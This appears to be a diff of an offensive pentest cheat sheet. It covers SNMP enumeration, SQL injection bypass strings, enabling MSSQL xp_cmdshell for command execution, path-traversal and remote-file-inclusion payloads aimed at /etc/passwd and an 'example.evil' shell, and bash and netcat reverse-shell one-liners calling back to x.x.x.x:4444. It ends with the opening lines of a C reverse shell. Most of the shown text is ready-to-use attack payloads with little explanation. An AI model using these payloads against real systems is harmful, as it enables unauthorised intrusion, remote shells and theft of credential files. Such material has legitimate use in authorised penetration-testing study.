@@ -277,9 +277,13 @@ access to https://example.com/path/to/smb/share/shell.aspx
 ### SNMP (161)
 ```bash
 # Enumerate entire MIB tree
-snmpwalk -c public -v2c <RHOST>
 snmp-check <RHOST>
 snmpwalk -c public -v1 -t 10 $ip
+snmpcheck -t $ip -c public
+snmpwalk -c public -v1 $ip 1|
+grep hrSWRunName|cut -d\* \* -f
+snmpenum -t $ip
+onesixtyone -c names -i hosts
 
 # Enumerate Windows users
 snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
@@ -361,8 +365,6 @@ Enumerate file privileges (see here for discussion of file_priv)
 SELECT user FROM mysql.user WHERE file_priv='Y';
 ```
 
-
-
 ### any other protocol Emuneration
 - https://docs.gorigorisensei.com/ports-enum 
 
@@ -374,6 +376,7 @@ searchsploit -x *50420*  #Searchsploit command to examine a specific exploit
 ```
 
 ### SQL injection
+https://ed4m4s.blog/tools/sql-injection-payloads 
 ```bash
 admin' or '1'='1
 ' or '1'='1
@@ -411,7 +414,7 @@ EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
-#Now we can run commands
+# with xp_cmdshell enabled, we can execute any Windows shell command through the EXECUTE statement
 EXECUTE xp_cmdshell 'whoami';
 
 #Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
@@ -427,7 +430,6 @@ http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 - https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/WEB/CHEATSHEETS/sqli.md
 - https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md
 
-
 #### LFI - often chained with php exploits. upload php payload and use LFI to read the payload and execute
 - https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
 - https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/
@@ -437,7 +439,6 @@ http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 <base url>/../../../../../../etc/passwd%00
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500
-
 
 #LFI check - Windows
 <base url>/../../../../../../../windows/system32/drivers/etc/hosts
@@ -478,8 +479,8 @@ http://example.com/index.php?page=http://example.evil/shell.txt%00
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/- https://guide.offsecnewbie.com/shells
 - Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
 - If connections drops or can not be established, try different ports 80,443,8080...
+
 ```bash
-#Bash
 bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
 /bin/bash -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
 /bin/sh -i > /dev/tcp/x.x.x.x/4444 0<&1 2>&1
@@ -518,7 +519,6 @@ rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 4444 0/tmp/p
 
 ```c
 // gcc reverse.c -o reverse
-
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/socket.h>
